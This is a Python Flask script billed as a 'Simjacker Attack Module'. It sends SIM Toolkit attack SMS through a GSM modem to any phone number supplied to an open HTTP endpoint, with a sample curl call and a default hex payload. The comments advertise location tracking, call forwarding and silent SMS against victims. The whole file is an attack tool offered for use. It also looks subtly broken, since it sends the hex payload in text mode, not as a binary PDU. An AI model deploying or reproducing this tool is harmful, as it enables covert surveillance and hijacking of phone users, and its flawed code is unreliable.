import serial
import time
import logging
from flask import Flask, request, jsonify

app = Flask(__name__)
logging.basicConfig(filename="bts_simjacker_logs.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

# -------------------------------------------
# 📡 Simjacker Attack Module
# -------------------------------------------
# ✅ Exploits SIM Application Toolkit (STK) via SMS
# ✅ Can send location requests, call forwarding, and silent SMS
# ✅ Uses GSM modem for message injection
# ✅ API controlled execution
# -------------------------------------------

# Configure Serial Port for GSM Modem
SERIAL_PORT = "/dev/ttyUSB2"  # Adjust based on modem
BAUD_RATE = 115200

def send_simjacker(target_number, payload):
    """
    Sends a Simjacker payload via SMS.
    """
    try:
        modem = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=1)
        time.sleep(2)
        modem.write(b'AT+CMGF=1\r')  # Set to text mode
        time.sleep(1)
        modem.write(f'AT+CMGS="{target_number}"\r'.encode())
        time.sleep(1)
        modem.write(payload.encode() + b'\x1A')  # Ctrl+Z to send SMS
        time.sleep(2)
        logging.info(f"Simjacker payload sent to {target_number}: {payload}")
        return f"Simjacker payload sent to {target_number}"
    except Exception as e:
        logging.error(f"Error sending Simjacker payload: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/send_simjacker', methods=['POST'])
def send_simjacker_api():
    """
    API endpoint to send a Simjacker attack.
    Example:
    curl -X POST http://<server-ip>:5009/send_simjacker -H "Content-Type: application/json" \
    -d '{"target_number": "+1234567890", "payload": "D0C60B9000410000000101"}'
    """
    data = request.json
    target_number = data.get("target_number")
    payload = data.get("payload", "D0C60B9000410000000101")
    if not target_number:
        return jsonify({"status": "error", "message": "Target number required"})
    result = send_simjacker(target_number, payload)
    return jsonify({"status": "success", "message": result})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5009, debug=True)
